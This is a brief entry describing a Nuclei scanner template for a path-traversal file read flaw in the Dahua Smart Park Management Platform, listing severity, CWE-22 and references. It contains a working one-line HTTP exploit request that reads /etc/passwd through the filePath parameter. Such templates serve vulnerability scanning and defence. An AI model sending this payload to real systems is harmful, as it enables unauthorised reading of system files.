# Nuclei Template: Dahua Smart Park Management Platform - Arbitary File Read
**Template ID:** dahua-wpms-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`dahua-wpms-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Dahua Smart Park Management Platform is vulnerable to Local File Inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/passwd
```

## References
- https://mp.weixin.qq.com/s/uRhVl2XC5fTNKO8eDFFebA
- https://github.com/Vme18000yuan/FreePOC/blob/master/poc/pocsuite/dahua_zhyq_attachment_fileread.py
